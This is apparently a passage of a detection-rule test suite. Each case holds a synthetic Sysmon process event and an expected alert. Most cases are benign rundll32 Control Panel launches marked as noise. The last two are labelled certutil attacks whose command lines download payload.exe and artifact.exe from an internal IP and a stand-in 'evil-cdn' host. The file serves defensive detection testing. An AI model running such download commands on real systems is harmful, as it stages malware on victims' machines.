    {
      "name": "noise 936 | rundll32 legit | Control_RunDLL desk args",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:48:10.961962202Z\",\"eventRecordID\":\"550035\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:48:10.961\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl,,0\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 937 | rundll32 legit | Control_RunDLL desk args",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:49:19.969297400Z\",\"eventRecordID\":\"550036\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:49:19.969\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl,,0\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 938 | rundll32 legit | Control_RunDLL desk args",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:49:50.832228973Z\",\"eventRecordID\":\"550037\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:49:50.832\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl,,0\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 939 | rundll32 legit | Control_RunDLL",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:51:16.222333355Z\",\"eventRecordID\":\"550038\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:51:16.222\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 940 | rundll32 legit | Control_RunDLL desk.cpl",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:52:37.559667527Z\",\"eventRecordID\":\"550039\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:52:37.559\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 941 | rundll32 legit | Control_RunDLL quoted",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:53:47.382773914Z\",\"eventRecordID\":\"550040\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:53:47.382\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Windows\\\\System32\\\\shell32.dll\\\",Control_RunDLL\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 942 | rundll32 legit | Control_RunDLL quoted",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:55:29.659172244Z\",\"eventRecordID\":\"550041\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:55:29.659\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Windows\\\\System32\\\\shell32.dll\\\",Control_RunDLL\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 943 | rundll32 legit | Control_RunDLL desk args",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:57:19.629384191Z\",\"eventRecordID\":\"550042\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:57:19.629\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl,,0\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 944 | rundll32 legit | Control_RunDLL desk.cpl",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:58:40.852095058Z\",\"eventRecordID\":\"550043\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:58:40.852\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 945 | rundll32 legit | Control_RunDLL",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T20:59:10.328725878Z\",\"eventRecordID\":\"550044\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 20:59:10.328\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 946 | rundll32 legit | Control_RunDLL inetcpl",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:00:31.074450009Z\",\"eventRecordID\":\"550045\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:00:31.074\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Windows\\\\System32\\\\shell32.dll\\\",Control_RunDLL inetcpl.cpl,,4\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 947 | rundll32 legit | Control_RunDLL",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:02:47.937132247Z\",\"eventRecordID\":\"550046\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:02:47.937\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 948 | rundll32 legit | Control_RunDLL desk args",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:03:49.041244998Z\",\"eventRecordID\":\"550047\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:03:49.041\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl,,0\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 949 | rundll32 legit | Control_RunDLL inetcpl",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:04:59.439156831Z\",\"eventRecordID\":\"550048\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:04:59.439\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Windows\\\\System32\\\\shell32.dll\\\",Control_RunDLL inetcpl.cpl,,4\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "noise 950 | rundll32 legit | Control_RunDLL desk args",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:06:53.290600865Z\",\"eventRecordID\":\"550049\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:06:53.290\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\System32\\\\shell32.dll,Control_RunDLL desk.cpl,,0\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "alert": false
      },
      "category": "noise",
      "attack": null,
      "evasion": false,
      "expected_rule_id": 100251,
      "expected_level": 0,
      "mitre_id": null
    },
    {
      "name": "attack certutil 01 | urlcache download to Public",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:08:13.161152318Z\",\"eventRecordID\":\"550050\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:08:13.161\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f http://10.42.0.15/payload.exe C:\\\\Users\\\\Public\\\\payload.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -split -f http://10.42.0.15/payload.exe C:\\\\Users\\\\Public\\\\payload.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 02 | urlcache download to Temp",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:09:35.724736162Z\",\"eventRecordID\":\"550051\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:09:35.724\",\"processGuid\":\"{ec68d17b-1594-21de-e0ad-000000000019}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f https://cdn.evil-cdn.com/tools/artifact.exe C:\\\\Windows\\\\Temp\\\\artifact.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{12aa9a1a-d117-1565-dd16-000000000020}\",\"parentProcessId\":\"3973\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentCommandLine\":\"powershell.exe -NoProfile -Command \\\"certutil.exe -urlcache -split -f https://cdn.evil-cdn.com/tools/artifact.exe C:\\\\Windows\\\\Temp\\\\artifact.exe\\\"\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
